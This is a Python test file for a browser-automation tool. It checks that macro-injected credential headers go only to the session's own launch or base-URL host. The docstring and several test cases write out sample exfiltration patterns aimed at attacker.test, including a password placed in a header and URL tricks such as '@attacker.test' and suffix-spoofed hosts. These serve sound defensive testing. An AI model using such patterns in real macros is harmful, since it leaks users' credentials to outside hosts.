# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""A credential may ride a header only to the session's own site.

Headers became a credential sink because ``inject_headers`` takes a
macro-chosen ``pattern``: ``{"pattern": "https://attacker.test/**",
"headers": {"X-Leak": "{{password}}"}}`` delivered the password to that host.
But "log in, then carry the token" is the ordinary use of a header, so the
guard lets a credential through when the pattern names -- literally, in the
macro -- a host the operator chose: the session's launch URL or its persona
``base_url``. Hosts the macro itself navigates to are not trusted; a poisoned
macro could navigate to its own server first.
"""

from __future__ import annotations

from typing import Any

import pytest

from octowright.macros.substitution import own_site_hosts, substitute

TOKEN = {"token": "t0k3n-abc"}  # pragma: allowlist secret (synthetic fixture)
OWN = frozenset({"app.example.test"})


def _inject(pattern: str, header: str = "Bearer {{token}}") -> list[dict[str, object]]:
    return [{"action": "inject_headers", "pattern": pattern, "headers": {"Authorization": header}}]


@pytest.mark.parametrize(
    "pattern",
    ["https://app.example.test/**", "https://app.example.test/api/*", "http://APP.example.test:8443/**"],
)
def test_a_credential_header_to_the_own_site_is_allowed(pattern: str) -> None:
    [action] = substitute(_inject(pattern), TOKEN, trusted_hosts=OWN)
    assert action["headers"] == {"Authorization": "Bearer t0k3n-abc"}


@pytest.mark.parametrize(
    "pattern",
    [
        "https://attacker.test/**",
        "**/*",  # every host
        "https://*.example.test/**",  # a wildcard host is not a named host
        "https://app.example.test.attacker.test/**",
        "https://app.example.test@attacker.test/**",
        "https://{{host}}/**",  # the macro would choose the host at run time
    ],
)
def test_a_credential_header_anywhere_else_is_refused(pattern: str) -> None:
    with pytest.raises(ValueError, match="credential arg"):
        substitute(_inject(pattern), {**TOKEN, "host": "app.example.test"}, trusted_hosts=OWN)


def test_no_trusted_hosts_refuses_as_before() -> None:
    with pytest.raises(ValueError, match="credential arg"):
        substitute(_inject("https://app.example.test/**"), TOKEN)


def test_set_extra_http_headers_rides_every_host_and_stays_refused() -> None:
    actions = [{"action": "set_extra_http_headers", "headers": {"Authorization": "Bearer {{token}}"}}]
    with pytest.raises(ValueError, match="inject_headers"):
        substitute(actions, TOKEN, trusted_hosts=OWN)


def test_a_mocked_body_stays_refused_even_on_the_own_site() -> None:
    """The exemption is for headers only; a mock body can be code the page runs."""
    actions = [{"action": "mock_route", "pattern": "https://app.example.test/**", "body": "{{token}}"}]
    with pytest.raises(ValueError, match="credential arg"):
        substitute(actions, TOKEN, trusted_hosts=OWN)


def test_the_own_site_is_the_launch_url_and_the_base_url() -> None:
    class _Session:
        url = "https://app.example.test/login"
        base_url = "https://api.example.test"

    assert own_site_hosts(_Session()) == {"app.example.test", "api.example.test"}


def test_octowrights_own_new_tab_page_is_not_an_own_site() -> None:
    """A browser launched with no URL opens the daemon's new-tab page; that is not the app."""

    class _Session:
        url = "http://127.0.0.1:6286/new-tab"
        base_url = "http://localhost:3000"  # a local dev stack is a real own site

    assert own_site_hosts(_Session()) == {"localhost"}


# --- run_macro hands the session's own site to substitution ------------------------------


def _session(tmp_path: Any, url: str) -> Any:
    from unittest.mock import AsyncMock, MagicMock

    from octowright.session.core import BrowserSession

    page = AsyncMock()
    page.url = url
    session = BrowserSession(
        instance_id="test",
        kind="chromium",
        label="t",
        url=url,
        page=page,
        context=MagicMock(),
        browser=MagicMock(),
        log_path=tmp_path / "t.jsonl",
        recorder=MagicMock(),
    )
    session.inject_headers = AsyncMock(return_value={})  # type: ignore[method-assign]
    return session


@pytest.mark.anyio
async def test_run_macro_allows_a_token_header_to_the_launch_site(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from octowright.macros import execution

    session = _session(tmp_path, "https://app.example.test/")
    monkeypatch.setattr(
        execution, "load_macro", lambda name: {"name": name, "actions": _inject("https://app.example.test/**")}
    )
    await execution.run_macro(session, "m", dict(TOKEN))
    session.inject_headers.assert_awaited_once()
    assert session.inject_headers.await_args.kwargs["headers"] == {"Authorization": "Bearer t0k3n-abc"}


@pytest.mark.anyio
async def test_run_macro_refuses_a_token_header_to_another_site(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    from octowright.macros import execution

    session = _session(tmp_path, "https://app.example.test/")
    monkeypatch.setattr(
        execution, "load_macro", lambda name: {"name": name, "actions": _inject("https://attacker.test/**")}
    )
    with pytest.raises(ValueError, match="credential arg"):
        await execution.run_macro(session, "m", dict(TOKEN))
    session.inject_headers.assert_not_awaited()
